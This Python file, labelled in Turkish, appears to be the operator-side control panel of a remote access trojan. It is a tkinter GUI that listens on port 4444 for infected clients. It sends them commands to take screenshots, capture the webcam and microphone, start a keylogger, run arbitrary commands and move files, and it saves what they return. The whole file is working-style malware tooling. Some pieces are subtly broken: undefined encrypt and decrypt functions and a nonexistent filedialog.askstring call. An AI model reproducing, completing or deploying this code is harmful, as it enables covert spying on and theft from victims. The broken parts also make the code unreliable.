import socket
import threading
import tkinter as tk
from tkinter import filedialog, scrolledtext
from PIL import Image, ImageTk
import base64
import io

HOST = '0.0.0.0'
PORT = 4444
clients = []

# GUI Başlat
window = tk.Tk()
window.title("Gelişmiş Python RAT Kontrol Paneli")

output_area = scrolledtext.ScrolledText(window, width=100, height=30)
output_area.pack(pady=10)

command_entry = tk.Entry(window, width=80)
command_entry.pack(pady=5)

selected_client = None

# Bağlı istemciler için liste
client_listbox = tk.Listbox(window, height=5)
client_listbox.pack(pady=5)

def handle_client(conn, addr):
    clients.append((conn, addr))
    client_listbox.insert(tk.END, f"{addr[0]}:{addr[1]}")
    output_area.insert(tk.END, f"[+] Bağlandı: {addr}\n")

def accept_connections(server_socket):
    while True:
        conn, addr = server_socket.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

def get_selected_client():
    try:
        index = client_listbox.curselection()[0]
        return clients[index][0]
    except IndexError:
        output_area.insert(tk.END, "[-] Hiçbir istemci seçilmedi.\n")
        return None

def send_custom_command():
    client = get_selected_client()
    if not client:
        return

    cmd = command_entry.get()
    if not cmd:
        return

    try:
        client.send(encrypt(cmd).encode())
        data = decrypt(client.recv(1048576).decode())

        if data.startswith("[screenshot]") or data.startswith("[webcam]"):
            b64_data = data.split("]", 1)[1]
            image_data = base64.b64decode(b64_data)
            image = Image.open(io.BytesIO(image_data))
            image.show()

        elif data.startswith("[file]"):
            filename = filedialog.asksaveasfilename()
            with open(filename, "wb") as f:
                f.write(base64.b64decode(data.replace("[file]", "")))
            output_area.insert(tk.END, f"[+] Dosya kaydedildi: {filename}\n")

        elif data.startswith("[audio]"):
            filename = filedialog.asksaveasfilename(defaultextension=".wav")
            with open(filename, "wb") as f:
                f.write(base64.b64decode(data.replace("[audio]", "")))
            output_area.insert(tk.END, f"[+] Ses dosyası kaydedildi: {filename}\n")

        else:
            output_area.insert(tk.END, f"[Yanıt]\n{data}\n")

    except Exception as e:
        output_area.insert(tk.END, f"Hata: {e}\n")

    command_entry.delete(0, tk.END)

def upload_file():
    client = get_selected_client()
    if not client:
        return

    filepath = filedialog.askopenfilename()
    if not filepath:
        return

    filename = filepath.split("/")[-1]
    try:
        with open(filepath, "rb") as f:
            data = base64.b64encode(f.read())
        client.send(encrypt(f"upload {filename}").encode())
        client.send(data)
        output_area.insert(tk.END, f"[+] {filename} yükleniyor...\n")
    except Exception as e:
        output_area.insert(tk.END, f"Hata: {e}\n")

def download_file():
    client = get_selected_client()
    if not client:
        return

    filename = filedialog.asksaveasfilename()
    if not filename:
        return

    target = filedialog.askstring("İstemciden indir", "İstemcideki dosya adı:")
    if not target:
        return

    try:
        client.send(encrypt(f"download {target}").encode())
        data = decrypt(client.recv(1048576).decode())

        if data.startswith("[file]"):
            with open(filename, "wb") as f:
                f.write(base64.b64decode(data.replace("[file]", "")))
            output_area.insert(tk.END, f"[+] {filename} kaydedildi.\n")
        else:
            output_area.insert(tk.END, f"[-] Dosya alınamadı.\n")
    except Exception as e:
        output_area.insert(tk.END, f"Hata: {e}\n")

# Komut butonları
button_frame = tk.Frame(window)
button_frame.pack(pady=10)

tk.Button(button_frame, text="Komut Gönder", command=send_custom_command).grid(row=0, column=0, padx=5)
tk.Button(button_frame, text="Ekran Görüntüsü", command=lambda: send_command("screenshot")).grid(row=0, column=1, padx=5)
tk.Button(button_frame, text="Kamera", command=lambda: send_command("webcam")).grid(row=0, column=2, padx=5)
tk.Button(button_frame, text="Mikrofon Kaydı", command=lambda: send_command("mic")).grid(row=0, column=3, padx=5)
tk.Button(button_frame, text="Keylogger Başlat", command=lambda: send_command("keylogger")).grid(row=0, column=4, padx=5)
tk.Button(button_frame, text="Dosya Yükle", command=upload_file).grid(row=0, column=5, padx=5)
tk.Button(button_frame, text="Dosya İndir", command=download_file).grid(row=0, column=6, padx=5)

def send_command(cmd):
    command_entry.delete(0, tk.END)
    command_entry.insert(0, cmd)
    send_custom_command()

# Sunucuyu başlat
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(5)

threading.Thread(target=accept_connections, args=(server_socket,), daemon=True).start()
output_area.insert(tk.END, f"[+] Sunucu başlatıldı: {HOST}:{PORT}\n")

window.mainloop()
